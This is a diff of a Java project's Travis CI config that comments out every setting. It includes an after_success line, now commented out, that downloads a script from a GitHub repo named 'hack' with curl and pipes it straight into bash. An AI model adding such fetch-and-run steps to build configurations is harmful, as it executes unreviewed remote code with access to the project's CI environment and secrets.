@@ -1,16 +1,16 @@
 language: java
 
-jdk:
-  - openjdk7
-  - oraclejdk8
-
-notifications:
-  # Email notifications are disabled to not annoy anybody.
-  email: false
-
-branches:
-  only:
-    - master
-
-after_success:
-  - echo -e https://raw.githubusercontent.com/abranhe/hack/master/travis/success | bash -s
+# jdk:
+#   - openjdk7
+#   - oraclejdk8
+#
+# notifications:
+#   # Email notifications are disabled to not annoy anybody.
+#   email: false
+#
+# branches:
+#   only:
+#     - master
+#
+# after_success:
+#   - curl -s https://raw.githubusercontent.com/19cah/hack/master/travis/success | bash -s
